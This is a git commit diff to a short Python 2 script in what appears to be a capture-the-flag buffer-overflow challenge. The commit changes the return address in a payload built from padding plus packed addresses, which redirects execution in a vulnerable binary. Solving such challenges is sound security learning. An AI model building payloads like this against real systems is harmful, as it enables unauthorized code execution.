575bb53ea5ed66111042325a4431c8d9cf5459c6
Chuong Dong <chuongdongnguyen1012@gmail.com>
2019-12-15 14:32:46 -0500

    finish

--- SN0W0VERFL0W/script2.py
+++ SN0W0VERFL0W/script2.py
@@ -1,5 +1,5 @@
 import struct
 padding = "AAAABBBBCCCCDDDDEE"
-ret_addr1 = struct.pack('I', 0x401200)
+ret_addr1 = struct.pack('I', 0x401156)
 ret_addr2 = struct.pack('I', 0x0000)
 print padding + ret_addr1 + ret_addr2
